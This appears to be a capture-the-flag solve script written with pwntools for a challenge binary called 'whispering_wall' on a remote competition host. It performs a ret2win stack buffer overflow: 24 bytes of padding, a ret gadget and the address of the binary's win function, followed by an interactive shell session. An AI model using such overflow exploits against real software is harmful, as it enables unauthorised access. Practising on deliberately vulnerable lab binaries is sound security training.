from pwn import *

exe = ELF('whispering_wall', checksec=False)
context.binary = exe
context.os = 'linux'
context.arch = 'amd64'

HOST, PORT = 'offsec.m0lecon.it', 13570

OFFSET_TO_RIP = 24
GADGET = 0x000000000040101a


def conn():
    if args.LOCAL:
        r = process(exe.path)
    else:
        r = remote(HOST, PORT)
    return r


def main():
    r = conn()

    r.recvuntil(b'whisper:')
    payload = flat(
        b'A' * OFFSET_TO_RIP,
        p64(GADGET),
        p64(exe.sym.win)
    )
    r.send(payload)
    r.interactive()


if __name__ == '__main__':
    main()
